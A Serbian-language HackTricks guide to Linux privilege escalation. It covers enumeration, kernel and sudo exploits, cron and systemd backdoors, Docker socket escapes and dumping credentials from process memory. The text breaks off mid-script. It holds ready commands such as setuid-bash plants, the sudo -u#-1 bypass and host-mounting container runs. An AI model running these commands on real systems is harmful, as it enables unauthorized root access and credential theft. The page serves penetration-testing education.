# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem informacije

### OS informacije

Hajde da počnemo da stičemo neka saznanja o operativnom sistemu koji se pokreće
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate dozvole za pisanje u bilo kojoj fascikli unutar `PATH`** promenljive, možda ćete moći da preuzmete neke biblioteke ili binarne datoteke:
```bash
echo $PATH
```
### Env info

Zanimljive informacije, lozinke ili API ključevi u promenljivim okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji se može iskoristiti za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobru listu ranjivih kernela i neke već **kompilirane eksploite** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Ostale stranice gde možete pronaći neke **kompilirane eksploite**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive verzije kernela sa te veb stranice, možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći u pretrazi za kernel exploitima su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršiti NA žrtvi, proverava samo exploite za kernel 2.x)

Uvek **pretražujte verziju kernela na Google-u**, možda je vaša verzija kernela navedena u nekom kernel exploit-u i tada ćete biti sigurni da je taj exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux eskalacija privilegija - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je sudo verzija ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifikacija potpisa nije uspela

Proverite **smasher2 box of HTB** za **primer** kako bi ova ranjivost mogla biti iskorišćena
```bash
dmesg 2>/dev/null | grep "signature"
```
### Više sistemske enumeracije
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojati moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako ste unutar docker kontejnera, možete pokušati da pobegnete iz njega:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Proverite **šta je montirano i demontirano**, gde i zašto. Ako je nešto demontirano, možete pokušati da to montirate i proverite za privatne informacije.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojite korisne binarne datoteke
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je **bilo koji kompajler instaliran**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Ranjiv Softver Instaliran

Proverite **verziju instaliranih paketa i usluga**. Možda postoji neka stara verzija Nagios-a (na primer) koja bi mogla biti iskorišćena za eskalaciju privilegija…\
Preporučuje se da se ručno proveri verzija sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite da li je instaliran zastareli i ranjiv softver.

> [!NOTE] > _Imajte na umu da će ovi komandi prikazati mnogo informacija koje će većinom biti beskorisne, stoga se preporučuju neke aplikacije poput OpenVAS-a ili sličnih koje će proveriti da li je neka verzija instaliranog softvera ranjiva na poznate eksploite._

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebao** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite moguće [**electron/cef/chromium debuggers** koji rade, mogli biste to iskoristiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom `--inspect` parametra unutar komandne linije procesa.\
Takođe **proverite svoje privilegije nad binarnim datotekama procesa**, možda možete prepisati nečije.

### Praćenje procesa

Možete koristiti alate kao što su [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikaciju ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Memorija procesa

Neke usluge servera čuvaju **akreditive u čistom tekstu unutar memorije**.\
Obično će vam biti potrebne **root privilegije** da pročitate memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo obično korisnije kada ste već root i želite da otkrijete više akreditiva.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Imajte na umu da danas većina mašina **ne dozvoljava ptrace po defaultu**, što znači da ne možete dumpovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> Datoteka _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše pristupnost ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu biti debagovani, sve dok imaju isti uid. Ovo je klasičan način na koji je ptracing radio.
> - **kernel.yama.ptrace_scope = 1**: samo roditeljski proces može biti debagovan.
> - **kernel.yama.ptrace_scope = 2**: samo admin može koristiti ptrace, jer zahteva CAP_SYS_PTRACE sposobnost.
> - **kernel.yama.ptrace_scope = 3**: Niti jedan proces ne može biti praćen sa ptrace. Kada se postavi, potreban je restart da bi se ponovo omogućio ptracing.

#### GDB

Ako imate pristup memoriji FTP usluge (na primer), mogli biste dobiti Heap i pretražiti unutar njegovih akreditiva.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane oblasti**. **Mem** pseudo fajl **izlaže samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske oblasti čitljive** i njihovi ofseti. Koristimo ove informacije da **pretražimo mem fajl i izbacimo sve čitljive oblasti** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti koristeći /dev/kmem.\
Obično, `/dev/mem` je samo čitljiv za **root** i **kmem** grupu.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za linux

ProcDump je linux verzija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows. Preuzmite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Da biste dumpovali memoriju procesa, možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i dumpovati proces koji je u vašem vlasništvu
- Skripta A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Akreditivi iz memorije procesa

#### Ručni primer

Ako otkrijete da proces autentifikacije radi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dumpovati proces (vidite prethodne sekcije da pronađete različite načine za dumpovanje memorije procesa) i pretražiti kredencijale unutar memorije:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **poznatih fajlova**. Zahteva root privilegije da bi pravilno radio.

| Karakteristika                                     | Ime procesa          |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktivne FTP konekcije)                   | vsftpd               |
| Apache2 (Aktivne HTTP Basic Auth sesije)         | apache2              |
| OpenSSH (Aktivne SSH sesije - Sudo korišćenje)   | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

Proverite da li je neki zakazani posao ranjiv. Možda možete iskoristiti skriptu koju izvršava root (ranjivost sa džokerom? može li da menja datoteke koje koristi root? koristiti simboličke linkove? kreirati specifične datoteke u direktorijumu koji koristi root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, unutar _/etc/crontab_ možete pronaći PUTANJU: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju na to kako korisnik "user" ima privilegije pisanja nad /home/user_)

Ako unutar ovog crontaba korisnik root pokuša da izvrši neku komandu ili skriptu bez postavljanja putanje. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koristeći skriptu sa džokerom (Wildcard Injection)

Ako skripta koju izvršava root sadrži “**\***” unutar komande, možete to iskoristiti da napravite neočekivane stvari (kao što je privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je džoker prethodjen putanjom kao** _**/some/path/\***_, **nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više trikova sa džokerima:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Prepisivanje cron skripte i symlink

Ako **možete da modifikujete cron skriptu** koju izvršava root, možete vrlo lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum gde imate pun pristup**, možda bi bilo korisno da obrišete tu fasciklu i **napravite simbolički link ka drugoj** koja služi skripti koju kontrolišete.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron poslovi

Možete pratiti procese kako biste tražili procese koji se izvršavaju svake 1, 2 ili 5 minuta. Možda možete iskoristiti to i eskalirati privilegije.

Na primer, da **pratite svake 0.1s tokom 1 minuta**, **sortirate po manje izvršenim komandama** i obrišete komande koje su najviše izvršene, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete takođe koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će pratiti i navesti svaki proces koji se pokrene).

### Nevidljivi cron poslovi

Moguće je kreirati cron posao **stavljanjem povratka u red nakon komentara** (bez karaktera novog reda), i cron posao će raditi. Primer (obratite pažnju na karakter povratka u red):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usluge

### Writable _.service_ datoteke

Proverite da li možete da pišete u bilo koju `.service` datoteku, ako možete, **možete je modifikovati** tako da **izvršava** vaš **backdoor kada** se usluga **pokrene**, **ponovo pokrene** ili **zaustavi** (možda ćete morati da sačekate da se mašina ponovo pokrene).\
Na primer, kreirajte svoj backdoor unutar .service datoteke sa **`ExecStart=/tmp/script.sh`**

### Writable servisni binarni fajlovi

Imajte na umu da ako imate **dozvole za pisanje nad binarnim fajlovima koje izvršavaju usluge**, možete ih promeniti za backdoor-e tako da kada se usluge ponovo izvrše, backdoor-i će biti izvršeni.

### systemd PUTANJA - Relativne putanje

Možete videti PUTANJU koju koristi **systemd** sa:
```bash
systemctl show-environment
```
Ako otkrijete da možete **pisati** u bilo kojoj od fascikala na putanji, možda ćete moći da **povećate privilegije**. Trebalo bi da tražite **relativne putanje koje se koriste u konfiguracionim** datotekama servisa kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **izvršni** fajl sa **istim imenom kao relativna putanja binarnog fajla** unutar systemd PATH foldera u koji možete pisati, i kada se od servisa zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaša **backdoor će biti izvršena** (korisnici bez privilegija obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete koristiti `sudo -l`).

**Saznajte više o servisima sa `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd jedinice čije ime se završava sa `**.timer**` koje kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za kalendarske vremenske događaje i monotone vremenske događaje i mogu se izvršavati asinhrono.

Možete nabrojati sve tajmere sa:
```bash
systemctl list-timers --all
```
### Writable timers

Ako možete da modifikujete tajmer, možete ga naterati da izvrši neke instance systemd.unit (kao što su `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je jedinica:

> Jedinica koja se aktivira kada ovaj tajmer istekne. Argument je naziv jedinice, čija sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano postavlja na servis koji ima isto ime kao jedinica tajmera, osim sufiksa. (Vidi iznad.) Preporučuje se da naziv jedinice koja se aktivira i naziv jedinice tajmera budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu, trebali biste:

- Pronaći neku systemd jedinicu (kao što je `.service`) koja **izvršava zapisivu binarnu datoteku**
- Pronaći neku systemd jedinicu koja **izvršava relativnu putanju** i imate **zapisive privilegije** nad **systemd PUTANJOM** (da biste se pretvarali da ste taj izvršni program)

**Saznajte više o tajmerima sa `man systemd.timer`.**

### **Omogućavanje Tajmera**

Da biste omogućili tajmer, potrebne su vam root privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Napomena da je **tajmer** **aktiviran** kreiranjem symlink-a ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix domena soketa (UDS) omogućava **komunikaciju procesa** na istim ili različitim mašinama unutar klijent-server modela. Koriste standardne Unix deskriptore za međuračunarsku komunikaciju i postavljaju se putem `.socket` datoteka.

Soketi se mogu konfigurisati koristeći `.socket` datoteke.

**Saznajte više o soketima sa `man systemd.socket`.** Unutar ove datoteke, može se konfigurisati nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije su različite, ali se koristi sažetak da **naznači gde će slušati** soket (putanja AF_UNIX soket datoteke, IPv4/6 i/ili broj porta za slušanje, itd.)
- `Accept`: Prihvaća boolean argument. Ako je **true**, **instanca servisa se pokreće za svaku dolaznu konekciju** i samo soket konekcije se prosleđuje. Ako je **false**, svi slušajući soketi se **prosleđuju pokrenutoj servisnoj jedinici**, i samo jedna servisna jedinica se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sokete i FIFOs gde jedna servisna jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Zbog razloga performansi, preporučuje se pisanje novih demona samo na način koji je pogodan za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prihvaća jedan ili više komandnih redova, koji se **izvršavaju pre** ili **posle** kreiranja i vezivanja slušajućih **soketa**/FIFOs, redom. Prvi token komandnog reda mora biti apsolutna putanja do datoteke, a zatim slede argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja slušajućih **soketa**/FIFOs, redom.
- `Service`: Specifikuje naziv **servisne** jedinice **koju treba aktivirati** na **dolaznom saobraćaju**. Ova postavka je dozvoljena samo za sokete sa Accept=no. Podrazumevano je na servis koji nosi isto ime kao soket (sa zamenjenim sufiksom). U većini slučajeva, ne bi trebalo da bude potrebno koristiti ovu opciju.

### Writable .socket files

Ako pronađete **writable** `.socket` datoteku, možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što soket bude kreiran. Stoga, **verovatno ćete morati da sačekate da se mašina ponovo pokrene.**\
&#xNAN;_&#x4E;ote da sistem mora koristiti tu konfiguraciju soket datoteke ili backdoor neće biti izvršen_

### Writable sockets

Ako **identifikujete bilo koji writable soket** (_sada govorimo o Unix soketima, a ne o konfiguracionim `.socket` datotekama_), onda **možete komunicirati** sa tim soketom i možda iskoristiti ranjivost.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP soketi

Imajte na umu da može postojati nekoliko **soketa koji slušaju HTTP** zahteve (_ne govorim o .socket datotekama već o datotekama koje deluju kao unix soketi_). Ovo možete proveriti sa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako soket **odgovara HTTP** zahtevom, tada možete **komunicirati** s njim i možda **iskoristiti neku ranjivost**.

### Writable Docker Socket

Docker soket, često pronađen na `/var/run/docker.sock`, je kritična datoteka koja treba biti zaštićena. Po defaultu, može se pisati od strane `root` korisnika i članova `docker` grupe. Posedovanje prava pisanja na ovom soketu može dovesti do eskalacije privilegija. Evo pregleda kako se to može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Eskalacija privilegija sa Docker CLI**

Ako imate prava pisanja na Docker soketu, možete eskalirati privilegije koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete kontejner sa pristupom na nivou root-a do datotečnog sistema hosta.

#### **Korišćenje Docker API direktno**

U slučajevima kada Docker CLI nije dostupan, Docker soket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **Lista Docker slika:** Preuzmite listu dostupnih slika.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Kreirajte kontejner:** Pošaljite zahtev za kreiranje kontejnera koji montira root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Pokrenite novokreirani kontejner:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Priključite se kontejneru:** Koristite `socat` za uspostavljanje veze sa kontejnerom, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon postavljanja `socat` veze, možete izvršavati komande direktno u kontejneru sa pristupom na nivou root-a do datotečnog sistema hosta.

### Ostalo

Imajte na umu da ako imate dozvole za pisanje preko docker soketa jer ste **unutar grupe `docker`** imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/#docker-group). Ako [**docker API sluša na portu** možete takođe biti u mogućnosti da ga kompromitujete](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Proverite **više načina da pobegnete iz dockera ili ga zloupotrebite za eskalaciju privilegija** u:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako otkrijete da možete koristiti **`ctr`** komandu pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

Ako otkrijete da možete koristiti **`runc`** komandu pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticirani **sistem međuprocesne komunikacije (IPC)** koji omogućava aplikacijama da efikasno komuniciraju i dele podatke. Dizajniran sa modernim Linux sistemom na umu, nudi robusnu strukturu za različite oblike komunikacije aplikacija.

Sistem je svestran, podržavajući osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na **poboljšane UNIX domen sokete**. Pored toga, pomaže u emitovanju događaja ili signala, omogućavajući besprekornu integraciju među komponentama sistema. Na primer, signal iz Bluetooth demona o dolaznom pozivu može naterati muzički plejer da utiša, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za uslugama i pozive metoda između aplikacija, olakšavajući procese koji su tradicionalno bili složeni.

D-Bus funkcioniše na **modelu dozvoli/odbij** i upravlja dozvolama za poruke (pozivi metoda, emitovanje signala itd.) na osnovu kumulativnog efekta usklađivanja pravila politike. Ove politike specificiraju interakcije sa autobusom, potencijalno omogućavajući eskalaciju privilegija kroz eksploataciju ovih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, detaljno objašnjavajući dozvole za root korisnika da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe primenjuju se univerzalno, dok "podrazumevane" kontekst politike važe za sve što nije pokriveno drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Naučite kako da enumerišete i iskoristite D-Bus komunikaciju ovde:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerisati mrežu i utvrditi poziciju mašine.

### Opšta enumeracija
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne usluge koje rade na mašini sa kojom niste mogli da komunicirate pre nego što joj pristupite:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete da presretnete saobraćaj. Ako možete, mogli biste da uhvatite neke akreditive.
```
timeout 1 tcpdump
```
## Korisnici

### Generička Enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** su u sistemima, koji mogu da **prijave** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Neke verzije Linux-a su bile pogođene greškom koja omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristite** koristeći: **`systemd-run -t /bin/bash`**

### Groups

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proverite da li se nešto zanimljivo nalazi unutar clipboard-a (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
